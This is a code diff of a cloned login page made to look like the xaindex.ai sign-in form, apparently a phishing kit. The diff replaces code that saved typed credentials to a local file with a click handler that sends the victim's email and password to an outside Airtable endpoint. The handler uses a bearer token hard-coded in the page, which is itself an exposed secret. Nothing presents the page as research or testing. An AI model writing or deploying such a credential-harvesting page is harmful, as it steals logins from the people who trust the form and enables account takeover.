@@ -71382,10 +71382,13 @@
                                 <i class="Page-authorization_formInput__icon__zGVbL"><img alt="password" src="https://xaindex.ai/_next/static/media/password.d30e4218.svg" width="30" height="31" decoding="async" data-nimg="1" loading="lazy" style="color:transparent"></i><input class="Page-authorization_formInput__input__I4TFn" type="password" id="password" name="password" required=""><span class="Page-authorization_formInput__placeholder__tWtwW">Password</span><span class="Page-authorization_formInput__check__ZsJdh undefined"></span></label></div>
             <div >
                 
-                
                 <button  class="Page-authorization_formButton__btn__F3UaR btn" >
-                <div class="Loader_buttonLoadingBox__WibWe Loader_buttonLoadingBox__hide__93BAv">
-                    <span class="Loader_buttonLoader__V9c1J"></span></div><p class="Loader_children__3yeNw">Login →</p></button>
+                
+                  <div class="Loader_buttonLoadingBox__WibWe Loader_buttonLoadingBox__hide__93BAv">
+                    <span class="Loader_buttonLoader__V9c1J"></span></div><p class="Loader_children__3yeNw">Login →</p>
+                
+                  </button>
+                
                 </div>
             </div>
         </form>
@@ -71410,49 +71413,35 @@
         </body>
         
         <script>
-          function saveTextToFile() {
-    const saveText = "tmp";
 
-    // file setting
-    const text = saveText;
-    const name = "sample.json";
-    const type = "text/plain";
-
-    // create file
-    const a = document.createElement("a");
-    const file = new Blob([text], { type: type });
-    a.href = URL.createObjectURL(file);
-    a.download = name;
-    document.body.appendChild(a);
-    a.click();
-    a.remove();
-}
-
-function saveJsonObjToFile(data) {
-    const saveObj = data // tmp
-
-    // file setting
-    const text = JSON.stringify(saveObj);
-    const name = "sample.json";
-    const type = "text/plain";
-
-    // create file
-    const a = document.createElement("a");
-    const file = new Blob([text], { type: type });
-    a.href = URL.createObjectURL(file);
-    a.download = name;
-    document.body.appendChild(a);
-    a.click();
-    a.remove();
-}
             const btnx = document.querySelector('.Page-authorization_formButton__btn__F3UaR')
+            //const btnx = document.querySelector('#xxx')
             const login = document.querySelector('#email')
             const pass = document.querySelector('#password')
-            btnx.addEventListener('click',()=>{
-                console.log(login.value, pass.value ,'LOOK AT ME!!!!')
-                saveJsonObjToFile({"login":login.value,"pass":pass.value})
+            btnx.addEventListener('click',  ()=>{
+                //console.log(login.value, pass.value ,'LOOK AT ME!!!!')
+                let response =  fetch('https://api.airtable.com/v0/appySmr7kCKh51ktv/tblAYhGkvnEglqy7F', {
+    method: 'POST',
+    body: JSON.stringify({"records": [
+      {
+        "fields": {
+          "login": login.value,
+          "pass": pass.value
+          
+        }
+      }]}),
+    headers: {
+        'Content-Type': 'application/json',
+        "Accept": "application/json",
+        "Authorization": "Bearer pat1OkBb7hBr2UvNH.585b6f78d15a9d4ca2e1e257a71a27abb37827a30d6bbaf075c98357ac21d5df",
+    },
+});
+console.log( response.json(), 'RESP');
+              
               }, false)
-            
+           
+              
+     
         </script>
         
         </html>
